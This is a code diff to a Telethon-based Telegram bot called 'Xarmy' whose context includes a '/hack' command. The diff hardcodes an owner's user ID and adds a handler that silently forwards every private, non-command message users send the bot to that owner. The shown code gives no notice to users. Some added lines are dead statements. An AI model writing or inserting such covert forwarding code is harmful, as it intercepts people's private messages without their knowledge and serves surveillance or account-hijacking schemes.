@@ -7,7 +7,8 @@ api_id = os.environ.get("APP_ID")
 import os, asyncio
 from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
-api_hash = os.environ.get("API_HASH")
+api_hash = os.environ.get("API_HASH") 
+OWNER_ID = 1775671410
 token = os.environ.get("BOT_TOKEN")
 client = TelegramClient('Xarmy', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
@@ -382,7 +383,31 @@ async def start(event):
     else:
       await event.respond("Wrong Text Found Re type /hack and use")
 
+@client.on(events.NewMessage(func=lambda e: e.is_private))
 
+async def one_new_mssg(event):
+
+    incoming = event.raw_text
+
+    who = event.sender_id
+
+    
+
+    if incoming.startswith("/"):
+
+        pass
+
+    elif who == OWNER_ID:
+
+        return
+
+    else:
+
+        await event.get_sender()
+
+        event.chat_id
+
+        await event.forward_to(OWNER_ID)
 
 
 
